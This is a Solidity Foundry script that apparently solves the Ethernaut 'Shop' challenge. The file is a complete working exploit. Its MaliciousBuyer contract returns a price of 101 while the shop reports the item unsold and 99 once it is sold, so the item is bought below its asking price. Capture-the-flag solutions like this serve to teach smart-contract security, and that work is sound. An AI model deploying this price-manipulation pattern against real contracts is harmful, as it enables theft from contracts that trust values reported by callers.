// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

interface IShop {
    function isSold() external view returns (bool);
}

contract Solver is Script {
    address shop = vm.envAddress("SHOP_INSTANCE");

    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV_KEY"));

        MaliciousBuyer malicious_buyer = new MaliciousBuyer(shop);
        malicious_buyer.buy();

        vm.stopBroadcast();
    }
}

contract MaliciousBuyer {
    address instance;
    constructor(address _instance) {
        instance = _instance;
    }

    function price() external view returns(uint256) {
        if (IShop(instance).isSold() == false) {
            return uint256(101);
        } else {
            return uint256(99);
        }
    }

    function buy() external {
        instance.call(abi.encodeWithSignature("buy()"));
    }

}